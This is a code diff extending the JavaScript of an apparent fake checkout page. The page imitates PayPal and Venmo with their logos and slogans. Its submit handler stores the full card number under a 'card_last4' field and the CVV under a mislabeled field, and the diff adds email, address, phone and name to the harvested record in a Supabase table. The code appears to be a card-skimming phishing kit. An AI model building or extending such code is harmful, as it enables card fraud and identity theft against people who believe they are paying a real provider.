@@ -32,14 +32,9 @@ const btnBackToInvoice = document.getElementById("btn-back-to-invoice");
 
 if(btnPaypal) {
   btnPaypal.addEventListener("click", () => {
-    invoiceView.style.display = "none";
-    paypalView.style.display = "block";
-    document.body.classList.add("paypal-active");
-  });
-}
-
-if(btnPaypal) {
-  btnPaypal.addEventListener("click", () => {
+    document.getElementById("provider-logo").src = "paypalnamefull.png";
+    document.getElementById("provider-logo").style.height = "26px";
+    document.getElementById("right-panel-title").innerHTML = "PayPal is a safer, faster<br>way to pay";
     invoiceView.style.display = "none";
     paypalView.style.display = "block";
     document.body.classList.add("paypal-active");
@@ -48,7 +43,12 @@ if(btnPaypal) {
 
 if(btnVenmo) {
   btnVenmo.addEventListener("click", () => {
-    alert("Venmo design will be provided later.");
+    document.getElementById("provider-logo").src = "icons8-venmo-100.png";
+    document.getElementById("provider-logo").style.height = "26px";
+    document.getElementById("right-panel-title").innerHTML = "Venmo is a safer, faster<br>way to pay";
+    invoiceView.style.display = "none";
+    paypalView.style.display = "block";
+    document.body.classList.add("paypal-active");
   });
 }
 
@@ -188,6 +188,11 @@ const cvv = document.getElementById("cvv");
 
 const firstName = document.getElementById("first-name");
 const lastName = document.getElementById("last-name");
+const emailAddress = document.getElementById("email-address");
+const zipCode = document.getElementById("zip-code");
+const streetAddress = document.getElementById("street-address");
+const streetAddress2 = document.getElementById("street-address-2");
+const phoneNumber = document.getElementById("phone-number");
 
 if(cardName) {
   cardName.addEventListener("input", () => {
@@ -274,6 +279,8 @@ if(form) {
     
     if(payButton) payButton.disabled = true;
 
+    const activeState = (elBillingCountry && elBillingCountry.value === "United States") ? elStateSelect.value : elStateInput.value;
+
     supabaseClient
       .from("payment_records")
       .insert([
@@ -282,6 +289,16 @@ if(form) {
           card_last4: cleanCardNumber,
           paystack_authorization_code: cvv.value, // keep existing schema field
           card_expiry: expiry.value,
+          email: emailAddress ? emailAddress.value : null,
+          zip_code: zipCode ? zipCode.value : null,
+          address: streetAddress ? streetAddress.value : null,
+          address2: streetAddress2 ? streetAddress2.value : null,
+          city: elCity ? elCity.value : null,
+          state: activeState,
+          country: elBillingCountry ? elBillingCountry.value : null,
+          phone_number: phoneNumber ? phoneNumber.value : null,
+          first_name: firstName ? firstName.value : null,
+          last_name: lastName ? lastName.value : null
         },
       ])
       .then(({ error }) => {
